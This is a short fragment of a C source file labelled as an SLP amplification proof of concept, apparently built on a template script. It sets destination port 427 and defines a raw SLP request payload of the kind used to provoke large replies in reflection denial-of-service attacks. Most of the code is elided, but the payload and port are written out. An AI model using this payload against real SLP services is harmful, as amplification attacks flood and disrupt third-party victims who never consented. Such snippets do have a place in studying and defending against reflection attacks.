/*-------------------------------
slp amplification PoC on the dumb template C script.
- Phenomite + lidar
-------------------------------*/
#include <arpa/inet.h>
...
static unsigned int DPORT = 427;
static const char PAYLOAD[] = "\x02\t\x00\x00\x1d\x00\x00\x00\x00\x00s_\x00\x02en\x00\x00\xff\xff\x00\x07default";
